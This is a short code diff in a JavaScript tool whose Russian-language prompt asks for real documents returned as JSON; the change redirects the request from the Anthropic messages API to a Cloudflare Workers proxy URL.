@@ -514,7 +514,7 @@ ${topicKeywords}
 Только РУССКИЙ язык. Только РЕАЛЬНО найденные документы. Только JSON.`;
  log('Отправка запроса с веб-поиском...', 'info');
  try {
-   const resp = await fetch('https://api.anthropic.com/v1/messages', {
+   const resp = await fetch('https://monitoring.i-mpossible1551.workers.dev/', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
